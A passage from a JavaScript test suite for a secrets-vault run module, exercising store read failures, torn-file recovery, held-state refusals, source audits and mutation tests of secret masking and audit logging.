  ok(l1.held0 && l1.lifted && l1.ok && l1.m2Off && l1.m1On && !l0.lifted && !l0.ok, `r2920 THE LIFT WITHOUT A RESTART: held at the load, one read again failed, the next one read — lifted by itself; the owner's switch then lands and the OFF made before stands (m2 still OFF); red control: «a read again that never lifts» keeps refusing`, { l1, l0 });
  // (4) «MISSING» RIGHT AFTER «UNREADABLE» is read once more: the load fails, the read again answers «missing», the next one reads —
  // lifted; the load after it answers «missing» ONCE more, and is read again before it counts — the OFF switches stand; red control:
  // a «missing» taken at once (a new, empty store written over by the next switch)
  const missLeg = async (doorMod) => {
    const w = await world({ doorMod }); twoOff(w);
    const undoS = placeSync(fileOf(w), ['EIO']), undoA = placeAsync(fileOf(w), ['ENOENT']);
    let d, c, lifted;
    try {
      d = w.mk(doorMod, QUICK); d.setRunnable({ id: 'mounts:m1#secretKey', on: true, reauthed: true }); undoS();
      lifted = await waitLift(d, 1500);
      const undoS2 = placeSync(fileOf(w), ['ENOENT']);   // the load right after the lift reads «missing» once
      try { c = d.setRunnable({ id: 'mounts:m1#secretKey', on: true, reauthed: true }); } finally { undoS2(); }
      await waitLift(d, 1500);
    } finally { undoS(); undoA(); }
    return { lifted, first: c && c.code, kept: bothOff(suspendedOf(w)) };
  };
  const m1 = await missLeg(DOOR), m0 = await missLeg(doorCopy("    if (a.state === 'missing' && heldBefore) {", '    if (false) {', 'a «missing» taken at once'));
  ok(m1.lifted && m1.first === 'store_held' && m1.kept && !m0.kept, `r2920 «MISSING» RIGHT AFTER «UNREADABLE» IS READ ONCE MORE: a «missing» at the read again and at the load after the lift are each read again — the switch in that moment is refused by name and both OFF switches stand; red control: «a «missing» taken at once» writes a new, empty store over them`, { m1, m0 });
  // (5) TORN BYTES ARE KEPT ASIDE ONCE: bytes that were READ and do not parse — the door fails closed (as before), the bytes are kept
  // aside beside the store named by their digest, ONCE (a second life of the same bytes keeps no second copy)
  {
    const w = await world(); const torn = '{"suspended": ["mounts:m1#secretKey"], "ru';   // a torn write
    fs.writeFileSync(fileOf(w), torn);
    const d1 = w.mk(DOOR, SLOW); d1.setRunnable({ id: 'mounts:m2#secretKey', on: false });   // the load reads the torn bytes (kept aside), the door fails closed; the owner's write waits for the copy (refused by name while it is in flight)
    await sleep(50);
    fs.writeFileSync(fileOf(w), torn);   // the same torn bytes again, at the next life
    const d2 = w.mk(DOOR, SLOW); d2.setRunnable({ id: 'mounts:m2#secretKey', on: false });
    await sleep(50);
    const aside = fs.readdirSync(w.dataDir).filter((f) => f.startsWith(DOOR.STORE_FILE + '.corrupt-'));
    ok(aside.length === 1 && fs.readFileSync(path.join(w.dataDir, aside[0]), 'utf8') === torn, `r2920 TORN BYTES ARE KEPT ASIDE ONCE: the bytes that did not parse are kept beside the store, named by their digest (${aside.join(', ') || 'none'}), and a second life of the same bytes keeps no second copy`, aside);
  }
  // (6) TORN BYTES THAT COULD NOT BE KEPT ASIDE are never written over (the law's own: src/store-read.js afterSetAside — the file is
  // their only copy): the copy's write fails ONCE (PLACED) ⇒ HELD, the owner's switch refused by name, the file still the torn bytes;
  // the read again (its timer fired by hand) keeps them and lifts — the next switch lands; red control: a failed copy not held
  const unkeptLeg = async (doorMod) => {
    const w = await world({ doorMod }); const torn = '{"suspended": ["mounts:m1#secretKey"], "ru';
    fs.writeFileSync(fileOf(w), torn);
    const MS = 777777, again = [];   // the read again's own wait: its timer is kept here and fired by the leg, never by a clock
    const ex = { storeRetry: { firstMs: MS, maxMs: MS, missingMs: MS }, timers: { set: (fn, ms) => (ms === MS ? (again.push(fn), {}) : setTimeout(fn, ms)), clear: (h) => clearTimeout(h) } };
    const real = fs.promises.open; let fails = 1;   // the copy's own open (open · write · sync · close · rename)
    fs.promises.open = function (p, ...x) { if (typeof p === 'string' && path.basename(p).startsWith(DOOR.STORE_FILE + '.corrupt-') && fails > 0) { fails--; return Promise.reject(Object.assign(new Error('placed ENOSPC'), { code: 'ENOSPC' })); } return real.call(this, p, ...x); };
    let d, first, held, c1, tornStill, lifted, writtenAfter;
    try {
      d = w.mk(doorMod, ex);
      first = d.setRunnable({ id: 'mounts:m2#secretKey', on: false });   // the load reads the torn bytes; their copy is in flight
      await sleep(30);   // the copy's write failed (placed)
      held = !!d._storeHeld();
      c1 = d.setRunnable({ id: 'mounts:m2#secretKey', on: false });
      tornStill = fs.readFileSync(fileOf(w), 'utf8') === torn;
      if (again.length) again.shift()();   // the read again: the copy's write works now
      lifted = await waitLift(d, 1500);
      d.setRunnable({ id: 'mounts:m2#secretKey', on: false });   // the load after the lift: its compare with the copy beside it is in flight (refused by name) …
      await sleep(60);
      d.setRunnable({ id: 'mounts:m2#secretKey', on: false });   // … then the bytes are kept already — the write lands
      writtenAfter = fs.readFileSync(fileOf(w), 'utf8') !== torn;
    } finally { fs.promises.open = real; }
    const aside = fs.readdirSync(w.dataDir).filter((f) => f.startsWith(DOOR.STORE_FILE + '.corrupt-'));
    return { first: first && first.code, held, c1: c1 && c1.code, tornStill, lifted, writtenAfter, kept: aside.length === 1 && fs.readFileSync(path.join(w.dataDir, aside[0]), 'utf8') === torn };
  };
  const u1 = await unkeptLeg(DOOR), u0 = await unkeptLeg(doorCopy("if (!kept) hold('not set aside', null, TORN_UNKEPT);", '', 'a failed copy not held'));
  ok(u1.first === 'store_held' && u1.held && u1.c1 === 'store_held' && u1.tornStill && u1.lifted && u1.writtenAfter && u1.kept && !u0.tornStill,
    'r2920 TORN BYTES THAT COULD NOT BE KEPT ASIDE ARE NEVER WRITTEN OVER: while their copy is in flight the switch is refused by name; the copy failed (placed) ⇒ HELD, the next switch refused too and the file is still the torn bytes; the read again keeps them and lifts, and the switch after it lands; red control: «a failed copy not held» writes over their only copy', { u1, u0 });
  // the read again's timer kept and fired by the leg (its own wait, never a clock) — for the legs below
  const manualRetry = () => { const MS = 777777, again = []; return { again, ex: { storeRetry: { firstMs: MS, maxMs: MS, missingMs: MS }, timers: { set: (fn, ms) => (ms === MS ? (again.push(fn), {}) : setTimeout(fn, ms)), clear: (h) => clearTimeout(h) } } }; };
  // (7) 主开发 r3040 (a) — THE TORN COPY, THE FAMILY'S WAY: a short file left from before (a crash between a create and its write) is
  // never taken for the copy; a copy whose write fails PART-WAY (placed: three bytes written, then ENOSPC) leaves no file behind and
  // holds the store; the read again writes it WHOLE and lifts; its name is dated, no digest of the bytes; red control: a keep that
  // trusts «exists»
  const familyLeg = async (doorMod) => {
    const w = await world({ doorMod }); const torn = '{"suspended": ["mounts:m1#secretKey"], "ru';
    fs.writeFileSync(fileOf(w), torn);
    fs.writeFileSync(path.join(w.dataDir, DOOR.STORE_FILE + '.corrupt-2026-01-01T00-00-00-000Z'), torn.slice(0, 4));   // a short file from before
    const { again, ex } = manualRetry();
    const real = fs.promises.open; let fails = 1;   // the copy is written through its own handle (open · write · sync · close · rename)
    fs.promises.open = async function (p, ...x) { const fh = await real.call(this, p, ...x); if (typeof p === 'string' && path.basename(p).startsWith(DOOR.STORE_FILE + '.corrupt-') && fails > 0) { fails--; const rw = fh.writeFile.bind(fh); fh.writeFile = async (data) => { await rw(Buffer.from(data).subarray(0, 3)); throw Object.assign(new Error('placed ENOSPC'), { code: 'ENOSPC' }); }; } return fh; };
    let d, held = false, partLeft = true, lifted = false;
    try {
      d = w.mk(doorMod, ex);
      d.setRunnable({ id: 'mounts:m2#secretKey', on: false });   // the load: torn bytes — their copy fails part-way
      await sleep(60);
      held = !!d._storeHeld();
      partLeft = fs.readdirSync(w.dataDir).some((f) => f.includes('.part-'));
      if (again.length) again.shift()();
      lifted = await waitLift(d, 1500);
      d.setRunnable({ id: 'mounts:m2#secretKey', on: false });
      await sleep(60);
      d.setRunnable({ id: 'mounts:m2#secretKey', on: false });   // the owner's switch: writes over the torn file — their copy stands beside it
    } finally { fs.promises.open = real; }
    const copies = fs.readdirSync(w.dataDir).filter((f) => f.startsWith(DOOR.STORE_FILE + '.corrupt-'));
    return { held, partLeft, lifted, whole: copies.some((f) => fs.readFileSync(path.join(w.dataDir, f), 'utf8') === torn), dated: copies.every((f) => /\.corrupt-\d{4}-\d\d-\d\dT[\d-]+Z(-\d)?$/.test(f)), copies: copies.length };
  };
  const f1 = await familyLeg(DOOR), f0 = await familyLeg(doorCopy("if (st.isFile() && st.size === bytes.length && (await fs.promises.readFile(p)).equals(bytes)) return true;", 'if (st.isFile()) return true;', 'a keep that trusts «exists»'));
  ok(f1.held && !f1.partLeft && f1.lifted && f1.whole && f1.dated && !f0.whole, `r3040 (a) THE TORN COPY, THE FAMILY'S WAY: a short file from before is never taken for the copy; a copy that fails part-way leaves no file behind and HOLDS; the read again writes it whole (dated, no digest in its name — ${f1.copies} file(s)) and lifts; red control: «a keep that trusts «exists»» leaves only the short file`, { f1, f0 });
  // (8) 主开发 r3040 THE MUST — A PERSON'S PRESS WHILE HELD IS ATTENDED: a standing request filed while the store is held, its Allow
  // pressed (验证是你): refused BY NAME (store_held), the request still OPEN, nothing «put back», the file unchanged; after the lift
  // the same Allow lands; red control: a press road with no hold check (restore_failed, the request settled «denied»)
  const pressLeg = async (doorMod) => {
    const VUGs = R('src/server/vault-use-grants.js'), GSs = R('src/server/grants-store.js');
    const w = await world({ doorMod }); twoOff(w);
    const gss = GSs.create({ memory: true });
    const ugs = VUGs.create({ grants: () => gss, vault: w.vault, dataDir: w.dataDir, log: (m) => w.logs.push(String(m)) });
    const { again, ex } = manualRetry();
    const undo = placeSync(fileOf(w), ['EIO']);
    let d;
    try { d = w.mk(doorMod, { ...ex, useGrants: ugs, useFacts: (c) => ({ conversationKeys: [c.conversationId], groupIds: [] }) }); d.setRunnable({ id: 'mounts:m1#secretKey', on: false }); } finally { undo(); }   // the load: held
    const before = fs.readFileSync(fileOf(w), 'utf8'), logs0 = w.logs.length;
    const sq = await d.request({ caller: w.caller, entry: 'vault://mounts/m1/secretKey', purpose: 'a standing approval while the store is held', standing: true, hosts: ['api.example.com'], cwd: w.work });
    const first = sq && sq.askId ? d.answerRequest(sq.askId, { answer: 'standing', reauthed: true, person: true }) : null;
    const open1 = !!(sq && sq.askId && d._requests.has(sq.askId));
    const unchanged = fs.readFileSync(fileOf(w), 'utf8') === before, putBack = w.logs.slice(logs0).some((l) => /could not be put back/.test(l));
    if (again.length) again.shift()();
    const lifted = await waitLift(d, 1500);
    const second = open1 ? d.answerRequest(sq.askId, { answer: 'standing', reauthed: true, person: true }) : null;
    return { asked: !!(sq && sq.askId), first: first && first.code, open1, unchanged, putBack, lifted, second: !!(second && second.ok), sq: sq && (sq.code || null) };
  };
  const p1 = await pressLeg(DOOR), p0 = await pressLeg(doorCopy(NO_HOLD_PRESS, null, 'a press road with no hold check'));
  ok(p1.asked && p1.first === 'store_held' && p1.open1 && p1.unchanged && !p1.putBack && p1.lifted && p1.second && !p0.open1,
    `r3040 THE MUST — A PERSON'S PRESS WHILE HELD IS ATTENDED: a standing request's Allow while held is refused by name (store_held), the request stays open, nothing is «put back», the file is unchanged; pressed again after the lift it lands; red control: «a press road with no hold check» answers ${p0.first} and settles the request`, { p1, p0 });
  // (9) 主开发 r3040 (b) + (c) — THE HOLD IS ASKED FIRST at every owner door (a Revoke, a policy, a resume: refused by name, never «done»);
  // a hold that cannot mend by itself (the file a link) says its cause and what to do; red control: a Revoke with no hold check
  const firstLeg = async (doorMod) => {
    const w = await world({ doorMod }); twoOff(w);
    const link = path.join(w.dataDir, 'vault-run.real.json');
    fs.renameSync(fileOf(w), link); fs.symlinkSync(link, fileOf(w));   // the store is a link: never followed
    const d = w.mk(doorMod, SLOW);
    const sw = d.setRunnable({ id: 'mounts:m1#secretKey', on: true, reauthed: true });
    const rv = d.revokeApprovals({ id: 'mounts:m1#secretKey' }), pol = d.setPolicy({ id: 'mounts:m1#secretKey', text: '', reauthed: true }), rs = d.resumeGrant({ id: 'mounts:m1#secretKey', principal: 'conversation:c-1', reauthed: true });
    return { sw: sw && sw.code, cause: sw && sw.cause, words: String(sw && sw.words), rv: rv && (rv.code || (rv.ok ? 'ok' : '?')), pol: pol && pol.code, rs: rs && rs.code };
  };
  const g1 = await firstLeg(DOOR), g0 = await firstLeg(doorCopy(NO_HOLD_REVOKE, null, 'a Revoke with no hold check'));
  const winW = fs.readFileSync(path.join(REPO, 'src/lib/vault-reveal.js'), 'utf8');
  ok(g1.sw === 'store_held' && g1.cause === 'link' && /is a link/.test(g1.words) && !/try again in a minute/.test(g1.words) && g1.rv === 'store_held' && g1.pol === 'store_held' && g1.rs === 'store_held' && g0.rv === 'ok' && winW.includes("if (c === 'store_held' && r.cause === 'link') return t("),
    `r3040 (b) + (c): THE HOLD IS ASKED FIRST — a Revoke, a policy and a resume while held are refused by name (never «done»); a store that is a link says so and what to do (cause «${g1.cause}», never «try again in a minute»), worded in the window; red control: «a Revoke with no hold check» answers ${g0.rv}`, { g1, g0 });
  // (10) 主开发 r3147 (1) + (2) + (4) — THE ONE DOOR, read in the source: every owner door and press road starts at ownerLoad() (loaded,
  // then the hold asked): no door asks heldNow() itself, none loads before it; the three press callers and the legacy save ask heldIn()
  // before any settle; the two For-you card handlers and the route word store_held; red control: a planted door that asks the hold itself
  const doorCensus = (t) => {   // 主开发 r3267 (1): EVERY body that saves or writes the grants store, a load matched with any argument
    const strip = (x) => x.replace(/\/\/[^\n]*/g, '');
    const heads = [];   // spans read on the RAW text (a `//` inside a string never cuts a line short); each body's comments stripped after
    const spanOf = (m) => { const le = t.indexOf('\n', m.index + 1); if (le < 0) return t.length; const k = t.slice(le).search(/\n  \S/); return k < 0 ? t.length : le + k; };   // a body ends where the next statement at create()'s own level begins
    for (const m of t.matchAll(/\n  (?:async )?function ([A-Za-z_]\w*)\(/g)) heads.push([m.index, spanOf(m), m[1]]);
    for (const m of t.matchAll(/\n  const ([A-Za-z_]\w*) = (?:async )?\([^)]*\) => /g)) heads.push([m.index, spanOf(m), m[1]]);
    const WRITES_GRANTS = /useGrants\.(?:setRow|addMember|restoreRow|revoke|revokeWindow|drop|carry|carryWildcards|pruneWindows)\(/;
    const EXEMPT = {
      save: 'the writer itself — it asks the hold before it writes', carryAlways: 'a migration carry, run by load on a store that reads', carryWild: 'a migration carry, run by load on a store that reads',
      reserveHour: 'the policy judge\'s hour booking — its road is gated on a store that reads', releaseHour: 'the policy judge\'s hour booking', recordApproval: 'the policy judge\'s memo — gated on a store that reads',
      resumeMember: 'an inner step: its callers (resumeGrant, standOpen, the owner\'s Save) are doors', answerWindow: 'its press writes through standOpen (the one door); its pruneWindows is the window\'s end timer, in the grants\' own store',
      takeBack: 'the ✕ — a narrowing in the grants\' own store (its own hold); nothing of this store', saveRow: 'its write is the setRow wrapper, which asks ownerLoad({ carry: false }) for an owner\'s 验证是你 Save',
    };
    const bad = [], doors = [], seen = new Set();
    for (const [p, e, name] of heads) {
      const body = strip(t.slice(p, e));
      if (!/[^\w.]save\(/.test(body) && !WRITES_GRANTS.test(body)) continue;
      seen.add(name);
      if (EXEMPT[name]) continue;
      doors.push(name);
      const own = body.indexOf('ownerLoad('), ld = body.search(/[^\w.]load\(/);
      if (own < 0) bad.push(`${name}: no ownerLoad()`);
      if (/\bheldNow\(/.test(body)) bad.push(`${name}: asks heldNow() itself`);
      if (ld >= 0 && (own < 0 || ld < own)) bad.push(`${name}: loads before ownerLoad()`);
    }
    for (const n of Object.keys(EXEMPT)) if (!seen.has(n)) bad.push(`${n}: an exempt row with no body that saves (a dead row)`);
    const w0 = t.indexOf('    useGrants.setRow = (id, row, opts = {}) => {'), wrap = strip(t.slice(w0, t.indexOf('      return r;\n    };', w0)));
    if (!/opts\.reauthed === true\) \{ const o = ownerLoad\(\{ carry: false \}\); if \(o\.held\) return o\.held; \}/.test(wrap) || /\bheldNow\(/.test(wrap)) bad.push('the owner\'s Save: not through ownerLoad()');
    return { bad, doors, settles: (t.match(/\{ const h = heldIn\((so|r)\); if \(h\) return h; \}/g) || []).length };
  };
  const dc = doorCensus(SRCD), dcp = doorCensus(SRCD.replace(NO_HOLD_REVOKE[0][0], "    { const h = heldNow(); if (h) return h; } const o = { d: load() };"));
  const dcNew = doorCensus(SRCD.replace('  function setPolicy(', "  function zzNewDoor({ id } = {}) {\n    const d = load({ carry: true });\n    return save({ runnable: d.runnable, always: d.always });\n  }\n  function setPolicy("));
  const dcArg = doorCensus(SRCD.replace(NO_HOLD_SWITCH[0][0], "    load({ carry: true }); const o = ownerLoad(); if (o.held) return o.held;"));
  const UTA = fs.readFileSync(path.join(REPO, 'src/lib/user-todos-actions.js'), 'utf8'), RV = fs.readFileSync(path.join(REPO, 'src/routes/vault.js'), 'utf8'), VRV = fs.readFileSync(path.join(REPO, 'src/lib/vault-reveal.js'), 'utf8');
  const worded = UTA.split("showToast(code === 'store_held' || code === 'vault_use_marks_unread' ? heldPressWords(r) : code === 'ask_settled'").length - 1;   // r3255: the grants' marks worded too
  ok(!dc.bad.length && ['setRunnable', 'setPolicy', 'revokeApprovals', 'standOpen', 'answer'].every((n) => dc.doors.includes(n)) && dc.settles === 4 && dcp.bad.some((b) => /revokeApprovals: asks heldNow\(\) itself/.test(b)) && dcNew.bad.some((b) => /zzNewDoor: no ownerLoad/.test(b)) && dcArg.bad.some((b) => /setRunnable: loads before ownerLoad/.test(b)) && worded === 2 && /store_held: 503/.test(RV) && /\n  store_held: 'the vault\\'s run settings could not be read just now/.test(RV) && /export function heldPressWords\(r\)/.test(VRV),
    `r3147 (1) + (2) + (4) + r3267 (1) THE ONE DOOR: EVERY body that saves or writes the grants store (${dc.doors.join(', ')}; the rest named exempt with their reasons) starts at ownerLoad() — none asks the hold or loads (with any argument) before it, the owner's Save through ownerLoad({ carry: false }); ${dc.settles} press callers ask heldIn() before any settle; both For-you card handlers word store_held (${worded}), the route says it (503 and its words); red controls: a planted door that asks the hold itself (${dcp.bad.join('; ')}), a NEW door under another name, and a door that loads with an argument first are each named`, { dc, dcp, dcNew: dcNew.bad, dcArg: dcArg.bad, worded });
  // (11) 主开发 r3147 THE MUST — THE HOLD IS ASKED AFTER THE LOAD THAT CAN SET IT: torn bytes whose copy fails (placed: the copy's open
  // refused, the disk full) ⇒ held; a standing request filed while held; space back: the read again keeps the copy and lifts; the
  // person presses Allow — the press's own load meets the torn bytes again (their compare in flight): refused BY NAME, the request
  // still OPEN, nothing «put back»; once the compare has answered, a second Allow lands; red control: today's order (asked, then loaded)
  const tornPressLeg = async (doorMod) => {
    const VUGs = R('src/server/vault-use-grants.js'), GSs = R('src/server/grants-store.js');
    const w = await world({ doorMod }); twoOff(w);
    const gss = GSs.create({ memory: true });
    const ugs = VUGs.create({ grants: () => gss, vault: w.vault, dataDir: w.dataDir, log: (m) => w.logs.push(String(m)) });
    const torn = '{"suspended": ["mounts:m1#secretKey"], "ru';
    fs.writeFileSync(fileOf(w), torn);
    const { again, ex } = manualRetry();
    const real = fs.promises.open; let fails = 1;
    fs.promises.open = function (p, ...x) { if (typeof p === 'string' && path.basename(p).startsWith(DOOR.STORE_FILE + '.corrupt-') && fails > 0) { fails--; return Promise.reject(Object.assign(new Error('placed ENOSPC'), { code: 'ENOSPC' })); } return real.call(this, p, ...x); };
    let d, held = false, sq = null, lifted = false, first = null, open1 = false, second = null, putBack = false;
    try {
      d = w.mk(doorMod, { ...ex, useGrants: ugs, useFacts: (c) => ({ conversationKeys: [c.conversationId], groupIds: [] }) });
      d.setRunnable({ id: 'mounts:m2#secretKey', on: false });   // the load: torn bytes, their copy refused ⇒ HELD
      await sleep(60);
      held = !!d._storeHeld();
      sq = await d.request({ caller: w.caller, entry: 'vault://mounts/m1/secretKey', purpose: 'a standing approval across a torn lift', standing: true, hosts: ['api.example.com'], cwd: w.work });
      if (again.length) again.shift()();   // space back: the read again keeps the copy whole and lifts
      lifted = await waitLift(d, 1500);
      const logs0 = w.logs.length;
      first = sq && sq.askId ? d.answerRequest(sq.askId, { answer: 'standing', reauthed: true, person: true }) : null;   // the press's own load: the torn bytes again
      open1 = !!(sq && sq.askId && d._requests.has(sq.askId));
      putBack = w.logs.slice(logs0).some((l) => /could not be put back/.test(l));
      await sleep(80);   // the compare answered: the copy is there
      second = open1 ? d.answerRequest(sq.askId, { answer: 'standing', reauthed: true, person: true }) : null;
    } finally { fs.promises.open = real; }
    return { held, asked: !!(sq && sq.askId), lifted, first: first && first.code, open1, putBack, second: !!(second && second.ok) };
  };
  const t1 = await tornPressLeg(DOOR), t0 = await tornPressLeg(doorCopy(TODAY_ORDER, null, 'today\'s order: the hold asked, then loaded'));
  ok(t1.held && t1.asked && t1.lifted && t1.first === 'store_held' && t1.open1 && !t1.putBack && t1.second && !t0.open1,
    `r3147 THE MUST — THE HOLD IS ASKED AFTER THE LOAD THAT CAN SET IT: across a torn lift the press's own load meets the torn bytes again; its Allow is refused by name, the request stays open, nothing is «put back»; once the compare has answered the second Allow lands; red control: «today's order» answers ${t0.first} and settles the request`, { t1, t0 });
  // (12) 主开发 r3147 (5): a .part- left by a crash mid-copy is never a copy — the keep reaps it once it is a day old; a fresh one stays
  {
    const w = await world(); const torn = '{"suspended": ["mounts:m1#secretKey"], "ru';
    fs.writeFileSync(fileOf(w), torn);
    const oldPart = path.join(w.dataDir, DOOR.STORE_FILE + '.corrupt-2026-01-01T00-00-00-000Z.part-1-aaaaaaaa'), freshPart = path.join(w.dataDir, DOOR.STORE_FILE + '.corrupt-2026-01-02T00-00-00-000Z.part-2-bbbbbbbb');
    fs.writeFileSync(oldPart, 'x'); fs.writeFileSync(freshPart, 'y');
    const t2 = (Date.now() - 2 * 86400e3) / 1000; fs.utimesSync(oldPart, t2, t2);
    const d = w.mk(DOOR, SLOW); d.setRunnable({ id: 'mounts:m2#secretKey', on: false });   // the load: torn bytes — the keep runs
    await sleep(80);
    ok(!fs.existsSync(oldPart) && fs.existsSync(freshPart), 'r3147 (5): the keep reaps a .part- file once it is a day old (a crash mid-copy, never a copy); a fresh one stays', { old: fs.existsSync(oldPart), fresh: fs.existsSync(freshPart) });
  }
  // (13) 主开发 r3255 — THE GRANTS' MARKS HELD (vault-use-marks.json under the store-read law, src/server/vault-use-grants.js): a
  // standing request's Allow while the MARKS are held is refused BY NAME (vault_use_marks_unread) before ANY write — this store's file
  // untouched, the request OPEN, nothing «put back» — and once the marks read again (src/store-read-hold.js readAgainOf) the same
  // Allow lands. The fact is asked through the name the PRODUCTION object carries: the REAL module's marksUnread, and the wiring that
  // hands that module to this door is pinned below; red control: a press road that asks no marks' fact
  const SRH = R('src/store-read-hold.js');
  const marksLeg = async (doorMod) => {
    const VUGs = R('src/server/vault-use-grants.js'), GSs = R('src/server/grants-store.js');
    const w = await world({ doorMod }); twoOff(w);
    const gss = GSs.create({ memory: true });
    const ugs = VUGs.create({ grants: () => gss, vault: w.vault, dataDir: w.dataDir, log: (m) => w.logs.push(String(m)) });
    const d = w.mk(doorMod, { useGrants: ugs, useFacts: (c) => ({ conversationKeys: [c.conversationId], groupIds: [] }) });
    const sq = await d.request({ caller: w.caller, entry: 'vault://mounts/m1/secretKey', purpose: 'a standing approval, then the vault-use marks held', standing: true, hosts: ['api.example.com'], cwd: w.work });   // filed while the marks read
    ugs._marksHold.start({ state: 'unreadable', code: 'EIO' });   // the marks HELD after the filing — a PLACED failed read on the production module's own hold (as a lift whose re-read fails)
    const held = !!ugs.marksUnread();
    const before = fs.readFileSync(fileOf(w), 'utf8'), logs0 = w.logs.length;
    const press = () => d.answerRequest(sq.askId, { answer: 'standing', reauthed: true, person: true });
    let first = null; if (sq && sq.askId) for (let k = 0; k < 3; k++) { first = press(); if (!first || first.code !== 'ask_redrawn') break; }   // a redraw (the card's changes read again while held) keeps it open
    const open1 = !!(sq && sq.askId && d._requests.has(sq.askId));
    const unchanged = fs.readFileSync(fileOf(w), 'utf8') === before, putBack = w.logs.slice(logs0).some((l) => /could not be put back/.test(l));
    for (let k = 0; k < 4 && ugs.marksUnread(); k++) await SRH.readAgainOf('vault-use-marks.json');   // the marks read again (a missing file: its second look, then lifted)
    const lifted = !ugs.marksUnread();
    let second = null; if (open1) for (let k = 0; k < 3; k++) { second = press(); if (!second || second.code !== 'ask_redrawn') break; }
    return { held, asked: !!(sq && sq.askId), sq: sq && (sq.code || null), first: first && first.code, open1, unchanged, putBack, lifted, second: !!(second && second.ok) };
  };
  const k1 = await marksLeg(DOOR), k0 = await marksLeg(doorCopy(NO_MARKS_ASKED, null, 'a press road that asks no marks\' fact'));
  const WIRE = fs.readFileSync(path.join(REPO, 'src/server/mounts-plugins-wiring.js'), 'utf8');
  const runCreate = (WIRE.match(/const vaultRun = require\('\.\/vault-run-door\.js'\)\.create\(\{((?:(?!\}\);)[\s\S])*)\}\);/) || [])[1] || '';   // the door's ONE create call, to its close
  const wired = /const vaultUseGrants = require\('\.\/vault-use-grants\.js'\)\.create\(/.test(WIRE) && /\buseGrants: vaultUseGrants\b/.test(runCreate);
  ok(k1.held && k1.asked && k1.first === 'vault_use_marks_unread' && k1.open1 && k1.unchanged && !k1.putBack && k1.lifted && k1.second && wired && (!k0.unchanged || k0.putBack),
    `r3255 THE GRANTS' MARKS HELD: a standing request's Allow is refused by name (${k1.first}) before any write — this store untouched, the request open, nothing «put back»; the marks read again, the same Allow lands; asked through the REAL module's marksUnread, and the wiring hands that module to the door (src/server/mounts-plugins-wiring.js: useGrants: vaultUseGrants — ${wired ? 'pinned' : 'NOT FOUND'}); red control: «a press road that asks no marks' fact» writes this store and puts it back`, { k1, k0, wired });
  // (14) 主开发 r3255 (3): the Vault window's row says the hold in place — rowFacts carries `held` (and its cause) while the store is
  // held, and the row draws the hold's sentence (src/lib/vault-use-row.js heldRowWords, zh / ja); it redraws when the hold lifts
  {
    const w = await world(); twoOff(w);
    const undo = placeSync(fileOf(w), ['EIO']);
    let d, f;
    try { d = w.mk(DOOR, SLOW); d.setRunnable({ id: 'mounts:m1#secretKey', on: false }); f = d.rowFacts({ id: 'mounts:m1#secretKey' }); } finally { undo(); }
    const UR = fs.readFileSync(path.join(REPO, 'src/lib/vault-use-row.js'), 'utf8'), VR2 = fs.readFileSync(path.join(REPO, 'src/lib/vault-reveal.js'), 'utf8');
    ok(!!(f && f.held === true && f.paused) && /if \(r && r\.run && r\.run\.held\) host\.append\(el\('div', 'vw-use-bad', heldRowWords\(r\.run\)\)\);/.test(UR) && /row\.run\.held\) \? \(row\.run\.heldCause \|\| 'held'\) : null\]/.test(UR) && /export function heldRowWords\(run\)/.test(VR2),
      'r3255 (3): while held the row facts say so (held, paused) and the Vault window draws the hold\'s sentence in its place (heldRowWords; the row redraws when the hold lifts)', f);
  }
}

console.log('⑦ MUTANTS — patched copies of the door, each RED on its leg');
{
  const SRC = fs.readFileSync(path.join(REPO, 'src/server/vault-run-door.js'), 'utf8');
  const mutate = (from, to, tag) => { const n = SRC.split(from).length - 1; return { n, mod: M.load('src/server/vault-run-door.js', anchored(SRC, from, to, `test-vault-run ⑦ ${tag}`), tag) }; }; // B-0d3e: a moved anchor fails BY NAME (it built nothing in silence)
  const m1 = mutate('seen: seen.has(pair)', 'seen: true', 'nocard');
  const r1 = m1.mod ? await newShapeCards(m1.mod) : null;
  ok(m1.n === 1 && r1 && !r1.card && r1.ran, `MUTANT «a new shape without a card» (seen read as true): the patch hits once and the leg goes RED — it ran with NO card (${r1 && r1.by}); the shipped door draws one`, r1);
  const m2 = mutate('const line = { ...head, receipt, allowedBy: verdict.by,', 'const line = { ...head, receipt, env: m.env, allowedBy: verdict.by,', 'auditvalue');
  const r2 = m2.mod ? await auditClean(m2.mod) : null;
  ok(m2.n === 1 && r2 && r2.leaks.length > 0, `MUTANT «an audit line carrying a value» (the child's env on the line): the patch hits once and the leg goes RED (the oracle finds ${r2 && r2.leaks.join(', ')}); the shipped door writes none`, r2 && r2.leaks);
  // lane vault-scrub-forms: ONE scrubber per run — two (one per pipe, the shape before) let a split value by
  const twoW = workerCopy("m = VR.createRunMasker(msg.secrets, ['out', 'err'], msg.steps ? { steps: msg.steps } : {});", "m = ((a, b) => ({ push: (k, x) => (k === 'out' ? { out: a.push(x), err: '' } : { out: '', err: b.push(x) }), end: () => ({ out: a.end(), err: b.end() }), hits: 0, bytes: 0, byForm: {}, over: false, withheld: 0 }))(VR.createMasker(msg.secrets), VR.createMasker(msg.secrets));", 'two scrubbers one per pipe');
  const w3 = await world({ doorExtra: { scrubWorkerFile: twoW } }); openRow(w3); const r3 = await splitLeg(w3);
  ok(r3 && r3.lk.length > 0, `MUTANT «two scrubbers, one per pipe» (the pre-lane shape, in the run's worker): the split leg goes RED (the oracle finds ${r3 && r3.lk.join(', ')}); the shipped worker's ONE scrubber masks it`, r3);
  // a CUT keeps the held tail back: flushed, a long new form begun inside the bound would arrive in part
  const m4 = mutate('scrub.end(cut).then((e) => {', 'scrub.end().then((e) => {', 'cutflush');   // round 21: dropping the cut arg flushes the held tail RAW (cut=false ⇒ no maskTail) and leaks the half value
  let r4 = null;
  if (m4.mod) { const w4 = await world({ doorMod: m4.mod }); openRow(w4); const e = await runAnswered(w4, ENV('edge2')); const tl = (e.r.stdout || '').slice(-1200); r4 = { truncated: e.r.truncated, lk: leaks(tl, VALUE), head: tl.replace(/&#(\d+);/g, (m, d) => String.fromCodePoint(+d)).includes(VALUE.slice(0, 6)) }; }
  ok(m4.n === 1 && r4 && r4.truncated && (r4.lk.length > 0 || r4.head), 'MUTANT «a cut flushes the held tail»: the patch hits once and the edge leg goes RED (the first characters of the value\'s entities arrive); the shipped door drops them', r4);
  // round 20b: the base behaviour (54f757df) is RED — the card vanishes on expiry, and a late answer answers ask_expired
  const m5 = mutate('q.timer = timers.set(() => goLate(q), VR.ASK_TTL_MS)', "q.timer = timers.set(() => settle(q, 'expired', 'timeout'), VR.ASK_TTL_MS)", 'nolate');
  let r5 = null;
